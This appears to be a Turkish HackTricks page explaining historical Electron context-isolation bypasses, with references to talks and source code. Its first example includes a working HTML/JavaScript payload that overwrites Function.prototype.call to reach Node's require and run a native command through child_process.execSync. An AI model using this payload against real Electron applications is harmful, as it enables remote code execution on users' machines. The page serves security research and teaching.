# Electron dahili kodu üzerinden context-isolation RCE

{{#include ../../banners/hacktricks-training.md}}

Bunlar, context isolation olmadan güvenilmeyen renderer içeriği çalıştıran Electron uygulamalarına yönelik **tarihsel exploitation kalıplarıdır**. Context isolation, Electron 12'den beri varsayılan olarak etkindir ve önerilen bir güvenlik ayarı olmaya devam etmektedir.<sup>[[1]](#references)</sup> Dahili ayrıntılar Electron ve Node.js sürümlerine göre değişir; bu nedenle zinciri hedef uygulamayla birlikte gelen sürümlerde yeniden oluşturun.

## Örnek 1: `Function.prototype.call` üzerine yazma

Bu örnek, Masato Kinugawa'nın CureCon sunumundan alınmıştır.<sup>[[2]](#references)</sup>

Etkilenen tarihsel Electron derlemesinde, dahili ASAR kodu bir `process` `exit` listener'ı kaydediyordu. Context isolation devre dışıyken sayfa kodu ile Electron'un dahili kodu JavaScript prototiplerini paylaştığından, renderer kodu dahili listener çalışmadan önce `Function.prototype.call`'ı değiştirebiliyordu.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![contextIsolation RCE örneğinde kullanılan Electron asar.js dahili kod yolu](<../../images/image (1070).png>)

Dinleyici, Node.js'in event mekanizması üzerinden yönlendirildi. Orijinal sayfada artık geçerli olmayan bir `bin/events.js` yolu verilmişti; aynı tarihî commit'in güncel kaynak kodu `lib/events.js` altındadır.<sup>[[5]](#references)</sup>

![Electron contextIsolation RCE zincirinin ulaştığı Node events.js kod yolu](<../../images/image (793).png>)

Bu yolda `self`, Node.js'in process nesnesidir:

![Electron dahili kodu üzerinden Electron contextIsolation RCE - Örnek 1: "self" değerinin Node'un process nesnesi olduğu yer](<../../images/image (700).png>)

Tarihî process nesnesi, `require`'a giden bir yol sunuyordu:

```
process.mainModule.require
```

Listener dispatcher, handler'ı process object ile çağırdığı için `call`'u override etmek bu nesneyi geri elde edip native bir komut çalıştırabilir:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Örnek 2: prototype pollution

ElectroVolt sunumu, prototype pollution yoluyla bir require nesnesi elde eden başka bir tarihsel zinciri gösterir.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electron belgeleri - Bağlam yalıtımı](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Bağlam yalıtımı eksikliğini kötüye kullanma - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Electron'un tarihsel kaynak kodu - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Electron'daki yeni saldırı yüzeylerini ortaya çıkarırken popüler masaüstü uygulamalarını ele geçirmek](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Node.js'in tarihsel kaynak kodu - `lib/events.js` dinleyici dağıtımı](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
